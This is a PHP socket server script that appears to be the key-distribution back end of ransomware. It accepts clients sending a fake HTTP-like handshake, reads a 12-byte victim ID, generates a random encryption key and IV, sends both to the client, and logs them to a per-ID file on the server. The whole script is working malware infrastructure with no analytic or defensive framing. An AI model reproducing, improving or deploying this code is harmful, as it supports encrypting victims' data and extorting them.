<?php

if(!($sock = socket_create(AF_INET, SOCK_STREAM, 0)))
{
	$errorcode = socket_last_error();
    $errormsg = socket_strerror($errorcode);
    
    die("Couldn't create socket: [$errorcode] $errormsg \n");
}

echo "Socket created \n";

// Bind the source address
if( !socket_bind($sock, "127.0.0.1" , 69) )
{
	$errorcode = socket_last_error();
    $errormsg = socket_strerror($errorcode);
    
    die("Could not bind socket : [$errorcode] $errormsg \n");
}

echo "Socket bind OK \n";

if(!socket_listen ($sock , 10))
{
	$errorcode = socket_last_error();
    $errormsg = socket_strerror($errorcode);
    
    die("Could not listen on socket : [$errorcode] $errormsg \n");
}

echo "Socket listen OK \n";

echo "\nFuck it (Yeah, yeah), uh... \n=============================================\n";

//start loop to listen for incoming connections
while (true) 
{
	//Accept incoming connection - This is a blocking call
	$client =  socket_accept($sock);
	
	//display information about the client who is connected
	/*if(socket_getpeername($client , $address , $port))
	{
		echo "Client $address : $port is now connected to us. \n";
	}*/
	
	//read data from the incoming socket
	$input = socket_read($client, 28);
	if(strcmp($input, "HTTP 1.1 /member.php SSL3.4\x00") == 0)
	{
		$response = "HTTP 1.1 200 OK SSL2.1\x00";
		socket_write($client, $response);
		
		echo "Unidentified 081 handshake success \n";
		
		$USR_DI = socket_read($client, 12);
		
		$USR_ID = strtoupper(bin2hex($USR_DI));
		if(strlen($USR_ID) == 24)
		{
			$USR_FLE = "C:/nk/users/" . $USR_ID . ".TXT";
			if(!file_exists($USR_FLE))
			{
				echo "ID : " . $USR_ID . " START \n";
				
				$KEY_LOG = fopen($USR_FLE, "w");
				if(!$KEY_LOG)
				{
					die();
				}
				
				$RND_KEY = openssl_random_pseudo_bytes(16, $cstrong);
				socket_write($client, $RND_KEY);
			
				$RND_IV = openssl_random_pseudo_bytes(16, $cstrong);
				socket_write($client, $RND_IV);
				
				$IV_STR = strtoupper(bin2hex($RND_IV));
				echo "IV : \n" . $IV_STR . " \n";
				
				$KEY_STR = strtoupper(bin2hex($RND_KEY));
				echo "Key : \n" . $KEY_STR . " \n";
				
				fwrite($KEY_LOG, "IV : \n" . $IV_STR . " \n");
				fwrite($KEY_LOG, "Key : \n" . $KEY_STR . " \n");
				fclose($KEY_LOG);
			}
			else
			{
				echo "ID : " . $USR_ID . " FINISHED \n";
			}
		}
	}
}

?>